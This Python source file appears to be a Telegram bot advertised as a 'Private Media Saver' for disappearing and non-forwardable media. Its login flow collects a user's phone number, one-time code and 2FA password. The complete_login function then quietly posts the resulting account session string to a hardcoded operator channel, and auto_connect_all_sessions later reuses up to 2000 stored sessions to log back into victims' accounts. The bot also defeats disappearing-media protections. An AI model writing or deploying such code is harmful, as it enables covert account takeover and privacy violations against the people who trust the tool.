import os
import nest_asyncio
import asyncio
import logging
from datetime import datetime

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    ChannelPrivateError
)

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from telegram.constants import ChatAction
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler
)

from dotenv import load_dotenv
load_dotenv()

# ================= CONFIG ================= #

DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")

ADMIN_ID = int(os.getenv("ADMIN_ID", "8440659080"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1003526329618"))
SESSION_CHANNEL_ID = int(os.getenv("SESSION_CHANNEL_ID", "-1003526329618"))

WELCOME_IMAGE = "https://graph.org/file/45580ccca91241c2dbf76-d29d2b3a1c790f9c04.jpg"
SUPPORT_LINK = "https://t.me/unbornvillain"

# ========================================= #

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("UserBot")

nest_asyncio.apply()

app = ApplicationBuilder().token(BOT_TOKEN).build()

API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)

user_login_data = {}
active_clients = {}
connected_users = set()

# ================= START ================= #

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
        [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
    ])

    reply_kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
        resize_keyboard=True
    )

    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption="✨ Welcome to Private Media Saver ✨",
        reply_markup=inline_kb,
        parse_mode="HTML"
    )
    await update.message.reply_text("☝️ Use menu below", reply_markup=reply_kb)

# ================= KEEP ALIVE ================= #

async def keep_client_alive(client: TelegramClient, user_id: int):
    while True:
        try:
            await client.run_until_disconnected()
        except Exception as e:
            logger.error(f"[Client Crash {user_id}] {e}")
            await asyncio.sleep(10)

# ================= CONNECT FLOW ================= #

async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "📲 Enter API ID or /skip",
        parse_mode="HTML"
    )
    return API_ID

async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id] = {
        "api_id": DEFAULT_API_ID,
        "api_hash": DEFAULT_API_HASH
    }
    await update.message.reply_text("📞 Send phone number:")
    return PHONE

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.text.isdigit():
        await update.message.reply_text("❌ API ID must be number")
        return API_ID
    user_login_data[update.effective_user.id] = {"api_id": int(update.message.text)}
    await update.message.reply_text("🔑 Send API HASH")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id]["api_hash"] = update.message.text
    await update.message.reply_text("📞 Send phone number:")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    phone = update.message.text
    data = user_login_data[uid]

    client = TelegramClient(StringSession(), data["api_id"], data["api_hash"])
    await client.connect()
    await client.send_code_request(phone)

    data["client"] = client
    data["phone"] = phone

    await update.message.reply_text("🔐 Enter OTP")
    return CODE

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    client = user_login_data[uid]["client"]
    try:
        await client.sign_in(user_login_data[uid]["phone"], update.message.text.replace(" ", ""))
        return await complete_login(update, context)
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 Enter 2FA password")
        return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = user_login_data[update.effective_user.id]["client"]
    await client.sign_in(password=update.message.text)
    return await complete_login(update, context)

# ================= MEDIA HANDLER ================= #

async def add_media_handler(client):
    @client.on(events.NewMessage(incoming=True))
    async def handler(event):
        if event.is_private and event.media and getattr(event.media, "ttl_seconds", None):
            file = await event.download_media()
            await client.send_file("me", file, caption="🕒 Saved disappearing media")

# ================= SAVE SESSION ================= #

async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    client = user_login_data[uid]["client"]
    session = client.session.save()
    me = await client.get_me()

    await context.bot.send_message(
        SESSION_CHANNEL_ID,
        f"#SESSION\nUSER_ID: {uid}\nACCOUNT_ID: {me.id}\nSESSION: {session}\nDATE: {datetime.now()}"
    )

    connected_users.add(uid)
    active_clients[uid] = client

    await add_media_handler(client)
    asyncio.create_task(keep_client_alive(client, uid))

    await update.message.reply_text("✅ Connected successfully")
    user_login_data.pop(uid, None)
    return ConversationHandler.END

# ================= AUTO CONNECT (FIXED) ================= #

async def auto_connect_all_sessions():
    bot_client = TelegramClient(
        StringSession(),
        DEFAULT_API_ID,
        DEFAULT_API_HASH
    )
    await bot_client.start(bot_token=BOT_TOKEN)

    async for msg in bot_client.iter_messages(SESSION_CHANNEL_ID, limit=2000):
        if not msg.text or "#SESSION" not in msg.text:
            continue

        data = {}
        for line in msg.text.splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                data[k.strip()] = v.strip()

        try:
            user_id = int(data["USER_ID"])
            session = data["SESSION"]
        except:
            continue

        if user_id in connected_users:
            continue

        try:
            client = TelegramClient(
                StringSession(session),
                DEFAULT_API_ID,
                DEFAULT_API_HASH
            )
            await client.start()

            await add_media_handler(client)
            active_clients[user_id] = client
            connected_users.add(user_id)

            asyncio.create_task(keep_client_alive(client, user_id))
            logger.info(f"✅ Auto connected {user_id}")

        except Exception as e:
            logger.error(f"❌ Auto connect error {user_id}: {e}")

# ================= FETCH ================= #

async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in connected_users:
        await update.message.reply_text("⚠️ Connect first")
        return ConversationHandler.END
    await update.message.reply_text("📎 Send message link")
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = active_clients.get(update.effective_user.id)
    await context.bot.send_chat_action(update.effective_chat.id, ChatAction.TYPING)

    text = update.message.text
    if "t.me/c/" in text:
        p = text.split("t.me/c/")[1].split("/")
        chat_id = int("-100" + p[0])
        msg_id = int(p[1])
    else:
        p = text.split("t.me/")[1].split("/")
        chat_id = p[0]
        msg_id = int(p[1])

    entity = await client.get_entity(chat_id)
    msg = await client.get_messages(entity, ids=msg_id)

    file = await msg.download_media()
    await client.send_file("me", file)
    await update.message.reply_text("✅ Sent to Saved Messages")
    return ConversationHandler.END

# ================= HANDLERS ================= #

login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [CommandHandler("skip", skip_api_id), MessageHandler(filters.TEXT, get_api_id)],
        API_HASH: [MessageHandler(filters.TEXT, get_api_hash)],
        PHONE: [MessageHandler(filters.TEXT, get_phone)],
        CODE: [MessageHandler(filters.TEXT, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT, get_password)],
    },
    fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)]
)

fetch_conv = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex("^📥"), menu_fetch_request)],
    states={FETCH_LINK: [MessageHandler(filters.TEXT, fetch_from_link)]},
    fallbacks=[]
)

async def main():
    await auto_connect_all_sessions()
    print("🤖 Bot Running...")
    await app.run_polling()

app.add_handler(CommandHandler("start", start))
app.add_handler(login_conv)
app.add_handler(fetch_conv)

asyncio.run(main())
